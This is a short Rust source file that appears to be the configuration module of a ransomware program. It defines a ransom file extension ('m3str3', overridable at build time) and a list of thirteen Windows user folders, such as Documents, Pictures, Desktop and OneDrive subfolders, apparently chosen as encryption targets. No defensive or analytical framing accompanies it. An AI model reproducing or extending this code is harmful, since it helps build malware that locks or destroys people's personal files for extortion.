use std::sync::LazyLock;

pub static RANSOM_EXT: LazyLock<&str> =
    LazyLock::new(|| option_env!("RANSOM_EXT").unwrap_or("m3str3"));

pub static DIR_NAMES: [&str; 13] = [
    "Contacts",
    "Documents",
    "Downloads",
    "Favorites",
    "Music",
    "OneDrive\\Attachments",
    "OneDrive\\Documents",
    "OneDrive\\Pictures",
    "OneDrive\\Music",
    "Pictures",
    "Videos",
    "Desktop",
    "OneDrive\\Desktop",
];
